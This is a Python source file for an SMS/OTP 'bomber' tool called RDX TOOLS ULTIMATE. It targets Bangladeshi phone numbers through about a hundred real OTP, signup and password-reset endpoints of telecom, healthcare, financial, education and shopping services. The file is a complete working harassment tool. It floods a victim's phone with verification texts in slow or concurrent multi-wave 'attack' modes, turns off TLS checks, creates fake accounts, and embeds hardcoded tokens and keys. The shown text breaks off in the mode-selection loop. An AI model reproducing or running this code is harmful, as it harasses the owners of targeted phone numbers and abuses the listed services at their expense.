#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════╗
║           🔥 RDX TOOLS ULTIMATE v4.3 — PURE EDITION 🔥               ║
║      100+ APIs | Animated Attack | Slow+Fast | Auto-Adaptive         ║
║                  Created by: RDX HUNTER                              ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import asyncio
import aiohttp
import json
import ssl
import time
import random
import sys
import os
import signal
import platform
import socket
import datetime
import shutil
import multiprocessing
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================
#                    CONFIGURATION
# ============================================================
TOOL_NAME = "RDX TOOLS ULTIMATE"
CREATOR_NAME = "RDX HUNTER"
FB_ID = "RDX HUNTER"
TELEGRAM_USER = ""
TELEGRAM_GROUP = "https://t.me/rdx_tools"
VERSION = "4.3 PURE"

# Slow configuration
_cfg = [3, 2, 1, 1, 1]
# Fast configuration
_fast_cfg = [100, 0, 1, 3, 20]

# SSL Context
_ssl = ssl.create_default_context()
_ssl.check_hostname = False
_ssl.verify_mode = ssl.CERT_NONE


# ============================================================
#                    COLOR CLASS
# ============================================================
_c = {
    'g': '\033[92m', 'r': '\033[91m', 'y': '\033[93m', 'b': '\033[94m',
    'p': '\033[95m', 'c': '\033[96m', 'w': '\033[97m', 'B': '\033[1m',
    'u': '\033[4m', 'e': '\033[0m'
}

# Animation frames
_frames = ['\u280b', '\u2819', '\u2839', '\u2838', '\u283c']

# Global state
_state = {'paused': False, 'exit': False, 'total': 0, 'success': 0}
_current_mode = 'slow'


# ============================================================
#                    SIGNAL HANDLERS
# ============================================================
def _sig_handler_1(signum, frame):
    global _state
    _state['exit'] = True
    print(f"\n\n{_c['r']}🛑 BOMBING STOPPED BY USER!{_c['e']}")
    print(f"{_c['y']}💀 Total requests: {_state['total']}{_c['e']}")
    print(f"{_c['g']}✅ Successful: {_state['success']}{_c['e']}")
    print(f"{_c['p']}🔥 Created by: {CREATOR_NAME}{_c['e']}")
    sys.exit(0)


def _sig_handler_2(signum, frame):
    global _state
    _state['paused'] = not _state['paused']
    status = "⏸ PAUSED" if _state['paused'] else "▶ RESUMED"
    color = _c['y'] if _state['paused'] else _c['g']
    print(f"\n{color}ATTACK {status}{_c['e']}")


try:
    signal.signal(signal.SIGINT, _sig_handler_1)
    if hasattr(signal, 'SIGTSTP'):
        signal.signal(signal.SIGTSTP, _sig_handler_2)
except AttributeError:
    pass


# ============================================================
#                    UTILITIES
# ============================================================
def _clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def _get_device_info():
    try:
        hostname = socket.gethostname()
        try:
            ip_address = socket.gethostbyname(hostname)
        except Exception:
            ip_address = "127.0.0.1"
        return {"hostname": hostname, "ip": ip_address,
                "system": platform.system(), "release": platform.release()}
    except Exception:
        return {"hostname": "Unknown", "ip": "127.0.0.1",
                "system": "Unknown", "release": "Unknown"}


def _get_time():
    return datetime.datetime.now().strftime("%I:%M:%S %p")


def _get_date():
    return datetime.datetime.now().strftime("%A, %B %d, %Y")


# ============================================================
#                    BANNER
# ============================================================
def _print_banner():
    device_info = _get_device_info()
    current_time = _get_time()
    current_date = _get_date()

    banner_lines = [
        f"{_c['r']}{_c['B']}",
        "██████╗ ██████╗ ██╗  ██╗    ████████╗ ██████╗  ██████╗ ██╗     ███████╗",
        "██╔══██╗██╔══██╗╚██╗██╔╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝",
        "██████╔╝██║  ██║ ╚███╔╝        ██║   ██║   ██║██║   ██║██║     ███████╗",
        "██╔══██╗██║  ██║ ██╔██╗        ██║   ██║   ██║██║   ██║██║     ╚════██║",
        "██║  ██║██████╔╝██╔╝ ██╗       ██║   ╚██████╔╝╚██████╔╝███████╗███████║",
        "╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝",
        "",
        "██╗   ██╗██╗  ████████╗██╗███╗   ███╗ █████╗ ████████╗███████╗",
        "██║   ██║██║  ╚══██╔══╝██║████╗ ████║██╔══██╗╚══██╔══╝██╔════╝",
        "██║   ██║██║     ██║   ██║██╔████╔██║███████║   ██║   █████╗  ",
        "██║   ██║██║     ██║   ██║██║╚██╔╝██║██╔══██║   ██║   ██╔══╝  ",
        "╚██████╔╝███████╗██║   ██║██║ ╚═╝ ██║██║  ██║   ██║   ███████╗",
        " ╚═════╝ ╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝",
        f"{_c['e']}{_c['c']}{'=' * 80}",
        f"{_c['r']}{_c['B']}💀 RDX TOOLS ULTIMATE - 100+ APIs EDITION 💀{_c['c']}",
        f"{_c['y']}[ ALL 100+ APIs × SLOW & CONTROLLED × MAXIMUM POWER ]{_c['c']}",
        f"{_c['g']}[ BTCL + GP + E-COMMERCE + HEALTHCARE + ENTERTAINMENT + GAMING ]{_c['c']}",
        f"{'=' * 80}",
        f"\n{_c['g']}[SYSTEM INFO]{_c['e']}",
        f"{_c['y']}┌─ Date/Time: {_c['w']}{current_date} - {current_time}{_c['e']}",
        f"{_c['y']}├─ Hostname:  {_c['w']}{device_info['hostname']}{_c['e']}",
        f"{_c['y']}├─ IP:        {_c['w']}{device_info['ip']}{_c['e']}",
        f"{_c['y']}└─ System:    {_c['w']}{device_info['system']} {device_info['release']}{_c['e']}",
        f"\n{_c['c']}{'=' * 80}",
        f"{_c['g']}CTRL+C: Stop  {_c['y']}CTRL+Z: Pause/Resume{_c['c']}",
        f"{_c['p']}Created by: {_c['w']}{CREATOR_NAME}{_c['c']}",
        f"{'=' * 80}{_c['e']}"
    ]

    for line in banner_lines:
        print(line)


# ============================================================
#                    LOADING ANIMATION
# ============================================================
def _animate_loading(text, duration=2):
    end_time = time.time() + duration
    i = 0
    while time.time() < end_time:
        frame = _frames[i % len(_frames)]
        sys.stdout.write(f'\r{_c["c"]}[{_c["w"]}{frame}{_c["c"]}] {text}...{_c["e"]}')
        sys.stdout.flush()
        time.sleep(0.2)
        i += 1
    print(f'\r{_c["g"]}[{_c["w"]}✓{_c["g"]}] {text} completed!{_c["e"]}')


# ============================================================
#                    PHONE FORMAT
# ============================================================
def _format_phone_number(phone):
    cleaned = ''.join(filter(str.isdigit, phone))

    if cleaned.startswith('880'):
        cleaned = cleaned[3:]
    elif cleaned.startswith('88'):
        cleaned = cleaned[2:]
    elif cleaned.startswith('0'):
        cleaned = cleaned[1:]

    if not cleaned.startswith('1') or len(cleaned) < 10:
        cleaned = cleaned.zfill(10)

    return {
        'original': phone, 'cleaned': cleaned, 'with_0': f"0{cleaned}",
        'with_88': f"88{cleaned}", 'with_880': f"880{cleaned}",
        'with_plus88': f"+88{cleaned}", 'with_plus880': f"+880{cleaned}",
        'international': f"+88-{cleaned}"
    }


# ============================================================
#                    100+ API DATABASE
# ============================================================
API_TEMPLATES = [
    # ═══════ GRAMEENPHONE (12) ═══════
    ("POST", "https://weblogin.grameenphone.com/backend/api/v1/otp", {"msisdn": "{phone}"}),
    ("POST", "https://webloginda.grameenphone.com/backend/api/v1/otp", {"msisdn": "{phone}"}),
    ("POST", "https://gpayapp.grameenphone.com/prod_mfs/sub/user/checksignup",
        {"deviceId": "35{phone}30", "msisdn": "{phone}", "tran_type": "OTPREQSIGNUP"}),
    ("POST", "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
        {"phone": "{phone}", "email": "", "language": "en"}),
    ("POST", "https://bkwebsitethc.grameenphone.com/api/v1/offer/send_otp",
        {"msisdn": "{phone}"}),
    ("POST", "https://appcity.grameenphone.com/proxy/v2/user/session/get-otp",
        {"mobileNumber": "{phone}"}),
    ("POST", "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/{phone+88}",
        {"headers": {"Content-Type": "application/json",
                     "Authorization": "Bearer 1pake4mh5ln64h5t26kpvm3iri"}}),
    ("POST", "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{phone}/", None),
    ("POST", "https://api.mygp.cinematic.mobi/api/v1/otp/88{phone}/SBENT_3GB7D",
        {"accessinfo": {"access_token": "K165S6V6q4C6G7H0y9C4f5W7t5YeC6",
                        "referenceCode": "20190827042622"}}),
    ("POST", "https://gpwebms.grameenphone.com/api/v1/flexiplan-purchase/activation",
        {"payment_mode": "mobile_balance", "longevity": 1, "voice": 100, "data": 0,
         "fourg": 0, "bioscope": 0, "sms": 0, "mca": 0, "price": 69,
         "msisdn": "{phone}", "bundle_id": 60817, "is_login": False}),
    ("POST", "https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp",
        {"phone": "{phone}", "email": "", "language": "en"}),
    ("POST", "https://weblogin.grameenphone.com/backend/api/v1/otp", {"msisdn": "+{phone}"}),

    # ═══════ BTCL (5) ═══════
    ("POST", "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json",
        {"phoneNbr": "{phone}", "email": "", "OTPType": 1, "userName": ""}),
    ("POST", "https://phonebill.btcl.com.bd/api/bcare/anonym/sendOTP.json",
        {"phoneNbr": "{phone}", "email": "", "OTPType": 1, "userName": ""}),
    ("POST", "https://bdia.btcl.com.bd/client/client/registrationMobVerification-2.jsp?moduleID=1",
        {"actionType": "otpSend", "mobileNo": "{phone}"}),
    ("POST", "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json",
        {"phoneNbr": "+{phone}", "email": "", "OTPType": 1, "userName": ""}),
    ("POST", "https://phonebill.btcl.com.bd/api/bcare/anonym/sendOTP.json",
        {"phoneNbr": "88{phone}", "email": "", "OTPType": 1, "userName": ""}),

    # ═══════ ROBI / BANGLALINK (3) ═══════
    ("POST", "https://webapi.robi.com.bd/v1/account/register/otp", {"phone_number": "{phone}"}),
    ("POST", "https://www.robi.com.bd/en", [{"msisdn": "{phone}"}]),
    ("POST", "https://api.banglalink.net/api/v1/otp/send", {"msisdn": "{phone}"}),

    # ═══════ DELIVERY (6) ═══════
    ("POST", "https://api.redx.com.bd/v1/user/signup",
        {"name": "{phone}", "service": "redx", "phoneNumber": "{phone}"}),
    ("POST", "https://api.redx.com.bd:443/v1/user/signup",
        {"name": "{phone}", "service": "redx", "phoneNumber": "{phone}"}),
    ("POST", "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
        {"phoneNumber": "{phone}"}),
    ("POST", "https://api.pathao.com/api/v1/auth/login", {"phone": "{phone}"}),
    ("POST", "https://api.foodpanda.com.bd/api/v1/auth/login", {"phone": "{phone}"}),
    ("POST", "https://api.foodpanda.com.bd/api/v2/auth/login", {"phone": "{phone}"}),

    # ═══════ FOOD (4) ═══════
    ("POST", "https://api.kfcbd.com/register",
        {"id": None, "name": "RDX User", "email": "rdx{random}@gmail.com",
         "mobile": "{phone}", "address": None,
         "device_token": "dLvYmVLqT02A_ZAFsFa8gJ", "token": None, "dob": "", "otp": None}),
    ("POST", "https://foodaholic.com.bd/api/v1/auth/forgot-password", {"phone": "{phone+880}"}),
    ("POST", "https://foodaholic.com.bd/api/v1/auth/sign-up",
        {"f_name": "RDX", "l_name": "User", "phone": "{phone+880}",
         "email": "rdx{random}@gmail.com", "password": "Rdx@12345", "ref_code": ""}),
    ("POST", "https://www.shwapno.com/api/auth", {"phoneNumber": "{phone+880}"}),

    # ═══════ E-COMMERCE (7) ═══════
    ("POST", "https://www.bdstall.com/userRegistration/save_otp_info/",
        {"UserTypeID": "2", "RequestType": "1", "Name": "Md", "Mobile": "{phone}"}),
    ("POST", "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
        {"number": "{phone+880}"}),
    ("POST", "https://api-dynamic.chorki.com/v1/auth/login?country=BD&platform=mobile",
        {"number": "{phone}"}),
    ("POST", "https://m-backend.wafilife.com/wp-json/wc/v2/send-otp?p={phone}", None),
    ("POST", "https://app.kireibd.com/api/v2/send-login-otp", {"email": "{phone}"}),
    ("POST", "https://frontendapi.kireibd.com/api/v2/send-login-otp", {"email": "{phone}"}),
    ("POST", "https://meenabazardev.com/api/mobile/front/send/otp?CellPhone={phone}&type=login", None),

    # ═══════ BIKROY / RIDE (4) ═══════
    ("GET", "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}", None),
    ("POST", "https://api.garibookadmin.com/api/v3/user/login",
        {"recaptcha_token": "garibookcaptcha", "mobile": "{phone}", "channel": "web"}),
    ("POST", "https://api.garibookadmin.com/api/v4/user/login",
        {"mobile": "{phone+880}", "recaptcha_token": "garibookcaptcha", "channel": "web"}),
    ("POST", "https://chokrojan.com/api/v1/passenger/login/mobile",
        {"mobile_number": "{phone}",
         "otp_token": "826cb796fd3f163c420c8da1238aa9d1c4da36d4f5729d711a9cacaca47df5a7"}),

    # ═══════ EDUCATION (10) ═══════
    ("POST", "https://api.shikho.com/auth/v2/send/sms",
        {"phone": "{phone}", "type": "student", "auth_type": "signup", "vendor": "shikho"}),
    ("POST", "https://api.shikho.com/public/activity/otp",
        {"phone": "{phone}", "intent": "ap-discount-request"}),
    ("POST", "https://api.ostad.app/api/v2/user/with-otp", {"msisdn": "{phone}"}),
    ("POST", "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web&_lang=bn",
        {"mobile_no": "{phone}"}),
    ("POST", "https://www.ieducationbd.com/api/account/check_user", {"mobile": "{phone}"}),
    ("POST", "https://developer.quizgiri.xyz/api/v2.0/send-otp",
        {"country_code": "+88", "phone": "{phone}"}),
    ("POST", "https://new.mojaru.com/api/student/login", {"mobile_or_email": "{phone}"}),
    ("POST", "https://bb-api.bohubrihi.com/public/activity/otp",
        {"phone": "{phone}", "intent": "login"}),
    ("POST", "https://api.karigoripathsala.com/api/get-otp?phone={phone}", None),
    ("POST", "https://prod.etestpaper.net/api/v4/auth/otp",
        {"phone": "{phone}", "recaptcha": "668be73dcad2999a957ff440"}),

    # ═══════ HEALTHCARE (10) ═══════
    ("POST", "https://api.medeasy.health/api/send-otp/+88{phone}/", None),
    ("POST", "https://api.doctime.com.bd/api/authenticate",
        {"contact_no": "{phone}", "country_calling_code": "88"}),
    ("POST", "https://api.doctime.net/api/v2/authenticate",
        {"country_calling_code": "88", "contact_no": "{phone}", "timestamp": 1777760060}),
    ("POST", "https://doctorlivebd.com/api/patient/auth/otpsend",
        {"country_code": "880", "mobile": "{phone}"}),
    ("POST", "https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=122.0.0.0&os=Windows&osv=10",
        {"mobile": "{phone}", "fcmToken": "", "referral": ""}),
    ("POST", "https://api.osudpotro.com/api/v1/users/send_otp",
        {"mobile": "+88-{phone}", "deviceToken": "web", "language": "en", "os": "web"}),
    ("POST", "https://theclinicall.com/bkapi/auth/user/otp/signin",
        {"countryCode": "BD", "dialCode": "880", "phone": "{phone}"}),
    ("POST", "https://www.api-care-box.click/api/user/register/?version=otp",
        {"Name": "RDX User", "Phone": "{phone+880}"}),
    ("POST", "https://renixapi.renixcare.com/sms-api/send-otp", {"phone": "{phone}"}),
    ("POST", "https://api.doctorola.com/api/v1/otp/send", {"mobile": "{phone}"}),

    # ═══════ ENTERTAINMENT (8) ═══════
    ("POST", "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
        {"number": "{phone+880}"}),
    ("POST", "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
        {"number": "+880{phone}"}),
    ("POST", "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
        {"number": "{phone+880}"}),
    ("POST", "https://api.binge.buzz/api/v4/auth/otp/send", {"phone": "{phone+880}"}),
    ("POST", "https://web-api.binge.buzz/api/v3/otp/send/{phone}", None),
    ("POST", "https://api.chorki.com/v1/auth/login?country=BD&platform=mobile",
        {"number": "{phone}"}),
    ("POST", "https://api.hoichoi.tv/v1/auth/send-otp", {"phone": "{phone}"}),
    ("POST", "https://api.toffeelive.com/v1/auth/login", {"phone": "{phone}"}),

    # ═══════ FINANCIAL (5) ═══════
    ("POST", "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/",
        {"wallet_number": "{phone}",
         "geo_location": {"lat": 23.8979093, "long": 89.1356346},
         "referral": "",
         "firebase_token": "e7XC0AWRR5C6rGMm6yCaZ8",
         "device_uuid": "c65m117a8cbf5b1851b29f8b", "mno": "Robi"}),
    ("POST", "https://fundesh.com.bd/api/auth/generateOTP?service_key=", {"msisdn": "{phone}"}),
    ("POST", "https://api.hishabexpress.com/login/status",
        {"msisdn": "{phone}", "hash": "Hello"}),
    ("POST", "https://core.easy.com.bd/api/v1/forgot-password-otp",
        {"device_key": "2ea97d276a980993308116baa292cec9", "mobile": "{phone}"}),
    ("POST", "https://api.apex4u.com/api/auth/login", {"phoneNumber": "{phone}"}),

    # ═══════ JOB PORTAL (2) ═══════
    ("POST", "https://mybdjobsorchestrator-odcx6humqq-as.a.run.app/api/CreateAccountOrchestrator/CreateAccount",
        {"firstName": "RDX", "lastName": "User", "gender": "M",
         "email": "rdx{random}@gmail.com", "userName": "{phone}",
         "password": "Rdx@12345", "confirmPassword": "Rdx@12345", "status": 0,
         "mobile": "{phone}", "workAreaCategory": 2, "createdFrom": 0,
         "createdAt": "{timestamp}", "catTypeId": 1, "userNameType": "mobile",
         "countryCode": "88", "isTtc": False, "isActive": 0}),
    ("POST", "https://api.bdjobs.com/api/v1/user/otp/send", {"mobile": "{phone}"}),

    # ═══════ FASHION (4) ═══════
    ("POST", "https://api.sundora.com.bd/api/user/customer/",
        {"customer": {"email": "rdx{random}@gmail.com",
         "password": "#bUV?'3*N#7N}.g",
         "password_confirmation": "#bUV?'3*N#7N}.g",
         "phone": "{phone+880}", "draft_order_id": None,
         "first_name": "sdfgfd", "last_name": "fgfd",
         "note": {"birthday": "", "gender": "male"}, "withTimeout": True,
         "newsletter_email": True, "newsletter_sms": True}}),
    ("POST", "https://www.ishop.com.bd/register_otp",
        {"_token": "default_token", "phone": "{phone}",
         "email": "rdx{random}@gmail.com"}),
    ("POST", "https://app.priyoshikkhaloy.com/api/user/register-login.php", {"mobile": "{phone}"}),
    ("POST", "https://backend.sailor.clothing/api/v2/auth/password/forget_request",
        {"email_or_phone": "{phone}", "send_code_by": "phone"}),

    # ═══════ GAMING (6) ═══════
    ("POST", "https://www.jayabaji3.com/api/register/check-username",
        {"username": "rdx{random}", "email": "", "mobileno": "{phone}",
         "language": "bn", "langCountry": "bn-bd"}),
    ("POST", "https://www.pkluck2.com/wps/verification/sms/register",
        {"countryDialingCode": "880", "mobileNo": "{phone}"}),
    ("POST", "https://www.pkluck2.com/wps/verification/sms/noLogin",
        {"mobileNum": "{phone}", "countryDialingCode": "880"}),
    ("POST", "https://bajistar.com:1443/public/api/v1/getOtp?recipient=88{phone}", None),
    ("POST", "https://bcsexamaid.com/api/generateotp",
        {"mobile": "{phone}", "softtoken": "Rifat.Admin.2022"}),
    ("POST", "https://reseller.circle.com.bd/api/v2/auth/signup",
        {"name": "+88{phone}", "email_or_phone": "+88{phone}",
         "password": "123456", "password_confirmation": "123456",
         "register_by": "phone"}),

    # ═══════ TICKETS (4) ═══════
    ("POST", "https://api.bdtickets.com:20100/v1/auth",
        {"createUserCheck": True, "phoneNumber": "+88{phone}",
         "applicationChannel": "WEB_APP"}),
    ("POST", "https://apps.applink.com.bd/appstore-v4-server/login/otp/request",
        {"msisdn": "88{phone}"}),
    ("POST", "https://offers.sindabad.com/api/mobile-otp",
        {"key": "c94e67fb2a59af3b6fa21f24463b2061", "mobile": "+88{phone}"}),
    ("POST", "https://api.shohoz.com/v1.0/web/ticket/auth/send-otp", {"phone": "{phone}"}),

    # ═══════ UTILITY (10) ═══════
    ("POST", "https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send",
        {"phone": "{phone}"}),
    ("POST", "https://gateway.otithee.com/api/v1/generate-otp",
        {"request_type": "registration", "mobile_number": "{phone}"}),
    ("POST", "https://backend.timezonebd.com/api/v1/user/otp-login", {"phone": "{phone}"}),
    ("POST", "https://edgecoursebd.com/register", [{"phone": "{phone}"}]),
    ("POST", "https://apibeta.iqra-live.com/api/v1/sent-otp/{phone}", None),
    ("POST", "https://ultimateasiteapi.com/api/register-customer",
        {"customer_name": "RDX", "customer_password": "12345678",
         "customer_password_confirmation": "12345678",
         "customer_email": "rdx{random}@gmail.com",
         "customer_contact": "{phone}", "customer_dob": "2000-01-02",
         "customer_gender": "male"}),
    ("POST", "https://billing.proiojon.com/api/v1/auth/sign-up",
        {"name": "RDX{random}", "phone": "{phone}",
         "email": "rdx{random}@gmail.com", "password": "password123", "ref_code": ""}),
    ("POST", "https://api.kabbik.com/v1/auth/otpnew",
        {"msisdn": "88{phone}", "currentTimeLong": "{timestamp_ms}",
         "passKey": "qOQNBtVmoTTPVmfn"}),
    ("POST", "https://api.chardike.com/api/otp/send",
        {"phone": "{phone}", "otp_type": "login"}),
    ("POST", "https://salextra.com.bd/customer/checkusernameavailabilityonregistration",
        {"username": "{phone}", "loginType": "MOBILE",
         "__RequestVerificationToken": "CfDJ8LiTcoRywYZJiSdmMqGF8TUqJw9C6KMdGm1h66OVTdHacNf0PM5Ejsmu_DNPddqz7Sk"}),
]


# ============================================================
#                    PLACEHOLDER REPLACEMENT
# ============================================================
def _get_random_string(length=6):
    chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    return ''.join(random.choice(chars) for _ in range(length))


def _get_timestamp():
    return time.strftime("%Y-%m-%dT%H:%M:%S.000Z")


def _get_timestamp_ms():
    return int(time.time() * 1000)


def _replace_placeholders(obj, phone_data):
    if isinstance(obj, dict):
        return {k: _replace_placeholders(v, phone_data) for k, v in obj.items()}
    if isinstance(obj, list):
        return [_replace_placeholders(i, phone_data) for i in obj]
    if isinstance(obj, str):
        return (obj
                .replace("{phone+880}", phone_data['with_plus880'])
                .replace("{phone+88}", phone_data['with_plus88'])
                .replace("{phone}", phone_data['with_0'])
                .replace("{random}", _get_random_string(6))
                .replace("{timestamp}", _get_timestamp())
                .replace("{timestamp_ms}", str(_get_timestamp_ms())))
    return obj


def _build_api_list(phone_data):
    api_list = []
    for method, url, payload in API_TEMPLATES:
        final_url = (url
                     .replace("{phone+880}", phone_data['with_plus880'])
                     .replace("{phone+88}", phone_data['with_plus88'])
                     .replace("{phone}", phone_data['with_0']))
        final_payload = _replace_placeholders(payload, phone_data)
        api_list.append({
            "method": method,
            "url": final_url,
            "payload": final_payload,
        })
    return api_list


# ============================================================
#                    SERVICE MANAGER
# ============================================================
class _ServiceManager:
    def __init__(self, phone_data):
        self.phone_data = phone_data

    async def _increment_counters(self, success=True):
        global _state
        _state['total'] += 1
        if success:
            _state['success'] += 1

    def _log_request(self, service_name, status, response, phone_used):
        status_color = _c['g'] if status == 200 else _c['r']
        print(f"{_c['c']}[{_c['w']}#{_state['total']}{_c['c']}] {_c['y']}{service_name}{_c['e']}")
        print(f"{_c['g']}[PHONE] {_c['w']}{phone_used}{_c['e']}")
        print(f"{_c['g']}[STATUS] {status_color}{status}{_c['e']}")
        print(f"{_c['g']}[RESP] {_c['w']}{str(response)[:100]}...{_c['e']}")
        print(f"{_c['p']}{'-' * 50}{_c['e']}")

    async def _call_api(self, session, api, service_name):
        """Generic API caller with animation"""
        for i in range(5):  # 5 requests per API
            phone = self.phone_data['with_0']
            try:
                headers = {
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36",
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Content-Type": "application/json",
                    "Origin": api["url"].split('/')[0] + "//" + api["url"].split('/')[2] if '/' in api["url"] else "",
                }
                
                print(f"{_c['c']}[{i+1}/5] Sending to {phone}...{_c['e']}")
                
                if api["method"] == "GET":
                    async with session.get(api["url"], headers=headers,
                                            ssl=_ssl, timeout=15) as resp:
                        text = await resp.text()
                        self._log_request(service_name, resp.status, text, phone)
                        await self._increment_counters(resp.status == 200)
                else:
                    if api["payload"] is None:
                        async with session.post(api["url"], headers=headers,
                                                 ssl=_ssl, timeout=15) as resp:
                            text = await resp.text()
                            self._log_request(service_name, resp.status, text, phone)
                            await self._increment_counters(resp.status == 200)
                    else:
                        async with session.post(api["url"], headers=headers,
                                                 json=api["payload"], ssl=_ssl,
                                                 timeout=15) as resp:
                            text = await resp.text()
                            self._log_request(service_name, resp.status, text, phone)
                            await self._increment_counters(resp.status == 200)
                await asyncio.sleep(2)  # 2 second delay
            except Exception as e:
                self._log_request(service_name, 0, f"Error: {e}", phone)
                await self._increment_counters(False)
                await asyncio.sleep(2)

    async def _run_all_services_slowly(self):
        print(f"\n{_c['r']}🚀 LAUNCHING SLOW CONTROLLED ATTACK{_c['e']}")
        print(f"{_c['y']}⚡ ALL 100+ APIs SENDING 5 REQUESTS EACH ONE BY ONE!{_c['e']}")
        print(f"{_c['p']}💥 SLOW SPEED × CONTROLLED POWER × SEQUENTIAL BOMBING{_c['e']}")
        print(f"{_c['p']}{'=' * 60}{_c['e']}")

        timeout = aiohttp.ClientTimeout(total=20, connect=10)

        async with aiohttp.ClientSession(
            timeout=timeout,
            headers={
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36",
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.9",
                "Cache-Control": "no-cache"
            }
        ) as session:

            api_list = _build_api_list(self.phone_data)
            print(f"{_c['c']}[SLOW MODE] Running {len(api_list)} APIs sequentially (each sends 5 requests)...{_c['e']}")

            start_time = time.time()

            for idx, api in enumerate(api_list):
                if _state['exit']:
                    break
                # Extract service name from domain
                domain = api["url"].split('/')[2] if '/' in api["url"] else "Unknown"
                service_name = domain.split('.')[0].title()
                
                print(f"\n{_c['y']}🔄 Starting {service_name} - 5 requests...{_c['e']}")
                await self._call_api(session, api, service_name)
                print(f"{_c['g']}✅ {service_name} completed{_c['e']}")
                await asyncio.sleep(1)

            end_time = time.time()

            print(f"\n{_c['g']}[ATTACK COMPLETE] Slow controlled attack finished!{_c['e']}")
            print(f"{_c['g']}[SLOW SPEED] Attack completed in {end_time - start_time:.2f} seconds{_c['e']}")
            print(f"{_c['g']}[TOTAL SENT] {_state['total']} SMS requests sent{_c['e']}")

    async def _run_all_services_fast(self):
        print(f"\n{_c['r']}🚀 LAUNCHING FAST 100+ API ATTACK{_c['e']}")
        print(f"{_c['y']}⚡ ALL 100+ APIs - MAXIMUM SPEED CONCURRENT!{_c['e']}")
        print(f"{_c['p']}{'=' * 60}{_c['e']}")

        timeout = aiohttp.ClientTimeout(total=8, connect=3)
        connector = aiohttp.TCPConnector(
            limit=500, limit_per_host=100,
            ssl=_ssl, enable_cleanup_closed=True
        )

        async with aiohttp.ClientSession(
            timeout=timeout, connector=connector,
            headers={
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36",
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.9",
                "Cache-Control": "no-cache"
            }
        ) as session:

            print(f"{_c['c']}[FAST MODE] Running ALL 100+ APIs with maximum concurrency...{_c['e']}")
            start_time = time.time()
            tasks = []

            for wave in range(_fast_cfg[3]):
                wave_label = f"W{wave+1}"
                api_list = _build_api_list(self.phone_data)
                for api in api_list:
                    domain = api["url"].split('/')[2] if '/' in api["url"] else "Unknown"
                    service_name = domain.split('.')[0].title()
                    tasks.append(self._fast_service(session, api, f"{wave_label}-{service_name}"))

            print(f"{_c['y']}🔥 Launching {len(tasks)} concurrent API attacks across {_fast_cfg[3]} waves...{_c['e']}")
            results = await asyncio.gather(*tasks, return_exceptions=True)

            successful = sum(1 for r in results if r is True)
            end_time = time.time()

            print(f"\n{_c['g']}[ATTACK COMPLETE] Fast 100+ API attack finished!{_c['e']}")
            print(f"{_c['g']}[FAST SPEED] Attack completed in {end_time - start_time:.2f} seconds{_c['e']}")
            print(f"{_c['g']}[TOTAL SENT] {_state['total']} SMS requests sent{_c['e']}")

    async def _fast_service(self, session, api, label=""):
        try:
            print(f"{_c['c']}🚀 {label} - Fast request{_c['e']}")
            phone = self.phone_data['with_0']
            headers = {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36",
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json",
            }
            try:
                if api["method"] == "GET":
                    async with session.get(api["url"], headers=headers,
                                            ssl=_ssl, timeout=5) as resp:
                        await resp.text()
                        await self._increment_counters(resp.status == 200)
                else:
                    if api["payload"] is None:
                        async with session.post(api["url"], headers=headers,
                                                 ssl=_ssl, timeout=5) as resp:
                            await resp.text()
                            await self._increment_counters(resp.status == 200)
                    else:
                        async with session.post(api["url"], headers=headers,
                                                 json=api["payload"], ssl=_ssl,
                                                 timeout=5) as resp:
                            await resp.text()
                            await self._increment_counters(resp.status == 200)
                return True
            except Exception:
                await self._increment_counters(False)
                return False
        except Exception:
            return False

    async def run_all_services(self):
        if _current_mode == 'fast':
            await self._run_all_services_fast()
        else:
            await self._run_all_services_slowly()


# ============================================================
#                    MAIN
# ============================================================
async def _main():
    global _state, _current_mode

    _clear_screen()
    _print_banner()

    _animate_loading("Initializing RDX Ultimate Bomber", 2)
    _animate_loading("Loading 100+ APIs", 2)
    _animate_loading("Optimizing bombing modes", 1.5)

    # Mode selection
    print(f"\n{_c['y']}🎯 SELECT BOMBING MODE:{_c['e']}")
    print(f"{_c['g']}[1] SLOW MODE - All 100+ APIs (Slow & Controlled){_c['e']}")
    print(f"{_c['r']}[2] FAST MODE - All 100+ APIs (Maximum Speed){_c['e']}")

    while True:
        mode_choice = input(f"\n{_c['c']}[MODE] Choose mode (1 or 2): {_c['w']}").strip()
        if mode_choice == "1":
            _current_mode = 'slow'
